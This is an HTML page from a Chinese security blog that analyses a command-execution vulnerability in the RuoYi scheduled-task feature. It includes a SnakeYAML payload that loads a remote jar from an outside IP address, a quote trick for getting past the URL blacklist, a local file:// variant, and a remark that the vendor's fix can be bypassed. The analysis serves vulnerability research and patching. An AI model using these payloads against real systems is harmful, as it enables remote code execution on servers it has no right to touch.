@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>若依定时任务命令执行漏洞分析 | pety</title>
+  <meta name="description" content="漏洞描述​		RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），提供了三种版本，Vue分离、不分离及微服务版本，官网：http:&#x2F;&#x2F;www.ruoyi.vip&#x2F;。 ​		定时任务是若依提供的默认功能，通过添加定时任务处理类（支持Bean调用、Class类调用）即可调度">
+<meta property="og:type" content="article">
+<meta property="og:title" content="若依定时任务命令执行漏洞分析">
+<meta property="og:url" content="https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="漏洞描述​		RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），提供了三种版本，Vue分离、不分离及微服务版本，官网：http:&#x2F;&#x2F;www.ruoyi.vip&#x2F;。 ​		定时任务是若依提供的默认功能，通过添加定时任务处理类（支持Bean调用、Class类调用）即可调度">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105235759.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105923372.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110054122.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110918693.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526192240036.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526200425373.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526201759068.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527100321055.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527101154919.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142712071.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142821020.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142924365.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527143008138.png">
+<meta property="og:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527154459459.png">
+<meta property="article:published_time" content="2022-05-19T11:04:19.000Z">
+<meta property="article:modified_time" content="2022-05-27T07:57:43.338Z">
+<meta property="article:author" content="pety">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pety404.github.io/images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105235759.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Home" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">pety</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Chose you</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="title">若依定时任务命令执行漏洞分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-19T11:04:19.000Z" itemprop="datePublished">2022-05-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/" class="title">Apache Druid命令执行漏洞(CVE-2021-25646)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-19T03:30:35.000Z" itemprop="datePublished">2022-05-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/" class="title">freemarker模板注入SSTI</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-17T02:11:00.410Z" itemprop="datePublished">2022-05-17</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-若依定时任务命令执行漏洞分析" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      若依定时任务命令执行漏洞分析
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+	  <time datetime="2022-05-19T11:04:19.000Z" itemprop="datePublished">2022-05-19</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+  </span>
+
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 835(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 3(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>​		RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），提供了三种版本，Vue分离、不分离及微服务版本，官网：<a target="_blank" rel="noopener" href="http://www.ruoyi.vip/%E3%80%82">http://www.ruoyi.vip/。</a></p>
+<p>​		定时任务是若依提供的默认功能，通过添加定时任务处理类（支持<code>Bean</code>调用、<code>Class</code>类调用）即可调度执行对应的方法，如com.ruoyi.quartz.task.RyTask.ryParams(‘ry’)。如果输入的是java.lang.Runtime.getRuntime().exec(“”)，那就有可能达到命令执行目的。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>版本：RuoYi-Vue 3.7.0</p>
+<p>部署教程：<a target="_blank" rel="noopener" href="http://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html">http://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html</a></p>
+<p>若依定时任务提供调用类方法的能力，但是需要满足一定条件</p>
+<ul>
+<li>构造方法无参</li>
+<li>构造方法和调用的方法均为 public</li>
+</ul>
+<p>snakeyaml满足以上条件且可以代码执行</p>
+<p>payload：<code>org.yaml.snakeyaml.Yaml.load(&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http&#39;://100.8.6.108:8000/yaml-payload.jar&quot;]]]]&#39;)</code></p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105235759.png" alt="image-20220520105235759"></p>
+<p>yaml-payload.jar：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220520105923372.png" alt="image-20220520105923372"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本质：不安全的JAVA反射，外部输入可控实例化类，在定时任务功能触发。</p>
+<p><strong>1.新增定时任务</strong></p>
+<p>语句不能包含rmi:&#x2F;&#x2F;、ldap:&#x2F;&#x2F;、http:&#x2F;&#x2F;、https:&#x2F;&#x2F;字符，但是后续执行的时候会去掉参数的单引号，因此可以用rmi’:&#x2F;&#x2F;绕过</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110054122.png" alt="image-20220527110054122"></p>
+<p>往sys_job表插入任务记录，QRTZ_TRIGGERS保存触发器信息表。</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527110918693.png" alt="image-20220527110918693"></p>
+<p><strong>2.任务触发执行</strong></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.52.128:8073/prod-api/monitor/job/run">http://192.168.52.128:8073/prod-api/monitor/job/run</a></p>
+<p>com.ruoyi.quartz.controller.SysJobController#run –》 com.ruoyi.quartz.service.impl.SysJobServiceImpl#run</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526192240036.png" alt="image-20220526192240036"></p>
+<p>scheduler.triggerJob调用了开源任务调度器Quartz组件的api，表示立即执行任务。它根据jobId和jobGroup生成的JobKey去QRTZ_TRIGGERS查询需要执行的jobDetail。job_class_name列是定时任务的JobDetail。</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526200425373.png" alt="image-20220526200425373"></p>
+<p>从上表可以看出定时任务会去执行com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution类，跟进这个类，该类继承AbstractQuartzJob的execute方法。com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution#execute–》com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220526201759068.png" alt="image-20220526201759068"></p>
+<p>beanName获取类名，methodName获取方法名，methodParams获取方法参数，重点看下获取参数。取(、)作为methodStr，同时去掉单引号。</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527100321055.png" alt="image-20220527100321055"></p>
+<p> Object bean &#x3D; Class.forName(beanName).newInstance();   #实例化类对象的⽅法</p>
+<p> invokeMethod(bean, methodName, methodParams); #执行函数</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527101154919.png" alt="image-20220527101154919"></p>
+<p>反射的类、方法、参数是可控的，基于以上分析：</p>
+<p>1.class.newInstance() 的作用是调用这个类的无参构造函数，所以我们传入的类必须要存在无参构造函数</p>
+<p>2.getDeclaredMethod获取方法，只能是public、protected，因为没有禁用安全检查，不能调用private方法。</p>
+<p>3.参数类型只能是String&#x2F;int&#x2F;long&#x2F;double&#x2F;boolean</p>
+<p><strong>3.POC分析</strong></p>
+<p>POC是从远程URL加载jar包，有可能存在不出网的情况，可以使用file协议获取本地jar。网上公开绕过方法是修改上传文件的绝对路径，但这样会导致图片无法正常加载，需要谨慎操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.ruoyi.common.config.RuoYiConfig.setProfile(&#x27;/upload&#x27;)</span><br><span class="line"></span><br><span class="line">org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file://上传的绝对路径&quot;]]]]&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>新增时对目标字符串进行黑白名单限制</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142712071.png" alt="image-20220527142712071"></p>
+<p>不允许包含以下字符串：</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142821020.png" alt="image-20220527142821020"></p>
+<p>包含com.ruoyi字符串</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527142924365.png" alt="image-20220527142924365"></p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527143008138.png" alt="image-20220527143008138"></p>
+<p>以上修复方式是存在缺陷的，只对count&gt;1的className进行白名单检查，调用spring的bean对象则可以绕过</p>
+<p><img src="/../images/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220527154459459.png" alt="image-20220527154459459"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="若依定时任务命令执行漏洞分析" target="_blank" rel="external">https://pety404.github.io/2022/05/19/若依定时任务命令执行漏洞分析/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/" target="_blank"><span class="text-dark">pety</span><small class="ml-1x">Chose you</small></a></h3>
+        <div>无言</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/" title="Apache Druid命令执行漏洞(CVE-2021-25646)"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
